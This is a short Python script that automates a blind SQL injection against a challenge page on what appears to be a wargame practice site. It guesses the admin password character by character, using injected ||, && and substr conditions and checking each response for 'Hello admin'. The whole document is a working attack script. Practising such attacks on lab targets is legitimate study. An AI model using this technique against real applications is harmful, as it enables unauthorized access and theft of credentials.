import requests
import string

#settings
pw=""
string= string.digits + string.ascii_letters #0123456789abc...XYZ
url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw="
session = dict(PHPSESSID="input_your_session_id") #input your session id!


#starting Blind SQL Injection
for i in range(1, 9):
    for a in range(len(string)):
        query = url + "'||id = 'admin'%26%26substr(pw," + str(i) + ",1)='" + string[a]
        req = requests.post(query, cookies=session)

        if "Hello admin" in req.text:
            pw += string[a]
            break

print("pw = " + pw)
